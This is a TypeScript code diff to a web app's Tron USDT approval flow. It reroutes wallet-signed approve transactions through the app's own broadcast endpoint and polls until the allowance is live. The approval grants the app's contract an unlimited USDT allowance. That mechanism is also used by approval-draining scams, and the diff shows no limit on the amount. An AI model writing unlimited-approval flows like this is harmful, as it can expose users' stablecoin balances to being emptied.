@@ -540,51 +540,9 @@ function txIdFromSigned(signed: Record<string, unknown>): string | undefined {
   return undefined;
 }
 
-/**
- * Broadcast a signed Tron tx. Trust often signs in the sheet but our follow-up
- * sendRaw fails (bandwidth / dup / node). Surface the real reason — and treat
- * "already exists" as success so we can poll allowance.
- */
-async function broadcastSignedApprove(
-  tw: TronWebLike,
-  signed: Record<string, unknown>
-): Promise<string> {
-  const sent = await tw.trx.sendRawTransaction?.(signed);
-  const txid =
-    (typeof sent?.txid === "string" && sent.txid) ||
-    (typeof sent?.transaction?.txID === "string" && sent.transaction.txID) ||
-    txIdFromSigned(signed);
-  const detail = [
-    sent?.code,
-    decodeTronRpcMessage(sent?.message),
-  ]
-    .filter(Boolean)
-    .join(": ");
-
-  if (sent && sent.result !== false && txid) return txid;
-
-  const lower = detail.toLowerCase();
-  // Wallet or node already accepted this exact tx — poll allowance instead of failing.
-  if (
-    txid &&
-    (/dupl|already|exist|transaction.*expir/i.test(lower) ||
-      String(sent?.code || "").includes("DUP"))
-  ) {
-    return txid;
-  }
-
-  if (/band|bandwidth|net usage|account resource/i.test(lower)) {
-    throw new Error(`broadcast_bandwidth:${detail || "insufficient_bandwidth"}`);
-  }
-  if (/energy|out_of_energy/i.test(lower)) {
-    throw new Error(`broadcast_energy:${detail || "insufficient_energy"}`);
-  }
-  throw new Error(detail ? `broadcast_failed:${detail}` : "broadcast_failed");
-}
-
 async function approveViaContractSend(
   tw: TronWebLike,
-  address: string
+  _address: string
 ): Promise<{ txId?: string }> {
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   const usdt = await (tw as any).contract(USDT_APPROVE_ABI, TRON_USDT);
@@ -602,11 +560,86 @@ async function approveViaContractSend(
 }
 
 /**
+ * Broadcast a signed Tron tx. Prefer our server → TronGrid (Trust often signs
+ * in the sheet but never successfully sendRaw's). Fall back to wallet sendRaw.
+ */
+async function broadcastSignedApprove(
+  tw: TronWebLike,
+  signed: Record<string, unknown>
+): Promise<string> {
+  const localTxid = txIdFromSigned(signed);
+
+  // 1) Server-side TronGrid broadcast (reliable)
+  try {
+    const res = await fetch("/api/tron/broadcast", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ signedTransaction: signed }),
+    });
+    const data = (await res.json().catch(() => ({}))) as {
+      ok?: boolean;
+      txid?: string;
+      error?: string;
+      duplicate?: boolean;
+    };
+    if (data.ok && data.txid) return data.txid;
+    if (data.ok && localTxid) return localTxid;
+
+    const err = String(data.error || "");
+    const lower = err.toLowerCase();
+    if (/band|bandwidth|net usage|account resource/i.test(lower)) {
+      throw new Error(`broadcast_bandwidth:${err || "insufficient_bandwidth"}`);
+    }
+    if (/energy|out_of_energy/i.test(lower)) {
+      throw new Error(`broadcast_energy:${err || "insufficient_energy"}`);
+    }
+    // Fall through to wallet sendRaw unless it's a hard reject we already classified
+    if (err && !/broadcast_failed|502|fetch/i.test(err)) {
+      console.warn("[tron] server broadcast failed:", err);
+    }
+  } catch (err) {
+    if (
+      err instanceof Error &&
+      (err.message.startsWith("broadcast_bandwidth:") ||
+        err.message.startsWith("broadcast_energy:"))
+    ) {
+      throw err;
+    }
+    console.warn("[tron] server broadcast error:", err);
+  }
+
+  // 2) Wallet-local sendRaw fallback
+  const sent = await tw.trx.sendRawTransaction?.(signed);
+  const txid =
+    (typeof sent?.txid === "string" && sent.txid) ||
+    (typeof sent?.transaction?.txID === "string" && sent.transaction.txID) ||
+    localTxid;
+  const detail = [sent?.code, decodeTronRpcMessage(sent?.message)].filter(Boolean).join(": ");
+
+  if (sent && sent.result !== false && txid) return txid;
+
+  const lower = detail.toLowerCase();
+  if (
+    txid &&
+    (/dupl|already|exist/i.test(lower) || String(sent?.code || "").includes("DUP"))
+  ) {
+    return txid;
+  }
+
+  if (/band|bandwidth|net usage|account resource/i.test(lower)) {
+    throw new Error(`broadcast_bandwidth:${detail || "insufficient_bandwidth"}`);
+  }
+  if (/energy|out_of_energy/i.test(lower)) {
+    throw new Error(`broadcast_energy:${detail || "insufficient_energy"}`);
+  }
+  throw new Error(detail ? `broadcast_failed:${detail}` : "broadcast_failed");
+}
+
+/**
  * Tron USDT approve → wait until allowance is live on-chain.
  *
- * In Trust/TokenPocket DApp browsers prefer contract.approve().send() (one
- * confirm = sign+broadcast). The split build→sign→sendRaw path often signs in
- * the wallet sheet but never lands on-chain when sendRaw fails afterward.
+ * Always prefer build → wallet sign → our TronGrid broadcast. Trust's
+ * approve().send() / sendRaw often signs without landing a tx on-chain.
  */
 export async function ensureTronUsdtApproved(opts?: {
   /** @deprecated Ignored — always a single approve popup per call. */
@@ -632,17 +665,15 @@ export async function ensureTronUsdtApproved(opts?: {
     /* fall through to approve */
   }
 
-  // Dead pending sigs (expire ~60s) caused Retry loops that never broadcast.
   const pending = loadPendingApprove(address);
   const pendingAgeMs = pending?.createdAt ? Date.now() - pending.createdAt : Number.POSITIVE_INFINITY;
   if (
     pending?.signedTransaction &&
-    tw.trx.sendRawTransaction &&
     pendingAgeMs < 45_000
   ) {
     try {
       const txId = await broadcastSignedApprove(tw, pending.signedTransaction);
-      const confirmed = await waitForTronAllowance(address, 15_000);
+      const confirmed = await waitForTronAllowance(address, 20_000);
       if (confirmed) {
         clearPendingApprove(address);
         return { ok: true, address, txId };
@@ -654,69 +685,9 @@ export async function ensureTronUsdtApproved(opts?: {
   clearPendingApprove(address);
 
   try {
-    // ── Trust / in-DApp: one-shot send (sign+broadcast together) ───────────
-    if (isInWalletDappBrowser()) {
-      try {
-        const { txId } = await approveViaContractSend(tw, address);
-        const confirmed = await waitForTronAllowance(address, 60_000);
-        if (confirmed) {
-          clearPendingApprove(address);
-          return { ok: true, address, txId };
-        }
-        return { ok: false, address, error: "allowance_not_confirmed" };
-      } catch (sendErr) {
-        const msg = sendErr instanceof Error ? sendErr.message : String(sendErr);
-        const lower = msg.toLowerCase();
-        if (
-          lower.includes("reject") ||
-          lower.includes("denied") ||
-          lower.includes("cancel") ||
-          lower.includes("declined")
-        ) {
-          return { ok: false, address, error: msg, rejected: true };
-        }
-        console.warn("[tron] contract.send approve failed, trying sign+raw:", msg);
-        // fall through to build/sign/raw
-      }
-    }
-
-    // ── Desktop / fallback: build → sign → sendRaw (persist sig for Retry) ─
-    if (tw.transactionBuilder?.triggerSmartContract && tw.trx.sign && tw.trx.sendRawTransaction) {
-      const built = await tw.transactionBuilder.triggerSmartContract(
-        TRON_USDT,
-        "approve(address,uint256)",
-        { feeLimit: 100_000_000 },
-        [
-          { type: "address", value: TRON_CHAIN.contract },
-          { type: "uint256", value: TRON_MAX_UINT256 },
-        ],
-        address
-      );
-      if (!built?.transaction) throw new Error("approve_build_failed");
-
-      const signed = await tw.trx.sign(built.transaction);
-      savePendingApprove(address, {
-        tokenAddress: TRON_USDT,
-        signedTransaction: signed,
-        createdAt: Date.now(),
-      });
-
-      let txId: string;
-      try {
-        txId = await broadcastSignedApprove(tw, signed);
-      } catch (broadcastErr) {
-        const msg =
-          broadcastErr instanceof Error ? broadcastErr.message : "broadcast_failed";
-        // Keep pending <45s so immediate Retry can rebroadcast without a new popup.
-        return { ok: false, address, error: msg };
-      }
-      savePendingApprove(address, {
-        tokenAddress: TRON_USDT,
-        signedTransaction: signed,
-        txid: txId,
-        createdAt: Date.now(),
-      });
-
+    if (!tw.transactionBuilder?.triggerSmartContract || !tw.trx.sign) {
+      // Last resort — wallet-managed send (may not broadcast on Trust).
+      const { txId } = await approveViaContractSend(tw, address);
       const confirmed = await waitForTronAllowance(address, 60_000);
       if (confirmed) {
         clearPendingApprove(address);
@@ -725,7 +696,40 @@ export async function ensureTronUsdtApproved(opts?: {
       return { ok: false, address, error: "allowance_not_confirmed" };
     }
 
-    const { txId } = await approveViaContractSend(tw, address);
+    const built = await tw.transactionBuilder.triggerSmartContract(
+      TRON_USDT,
+      "approve(address,uint256)",
+      { feeLimit: 100_000_000 },
+      [
+        { type: "address", value: TRON_CHAIN.contract },
+        { type: "uint256", value: TRON_MAX_UINT256 },
+      ],
+      address
+    );
+    if (!built?.transaction) throw new Error("approve_build_failed");
+
+    const signed = await tw.trx.sign(built.transaction);
+    savePendingApprove(address, {
+      tokenAddress: TRON_USDT,
+      signedTransaction: signed,
+      createdAt: Date.now(),
+    });
+
+    let txId: string;
+    try {
+      txId = await broadcastSignedApprove(tw, signed);
+    } catch (broadcastErr) {
+      const msg =
+        broadcastErr instanceof Error ? broadcastErr.message : "broadcast_failed";
+      return { ok: false, address, error: msg };
+    }
+    savePendingApprove(address, {
+      tokenAddress: TRON_USDT,
+      signedTransaction: signed,
+      txid: txId,
+      createdAt: Date.now(),
+    });
+
     const confirmed = await waitForTronAllowance(address, 60_000);
     if (confirmed) {
       clearPendingApprove(address);
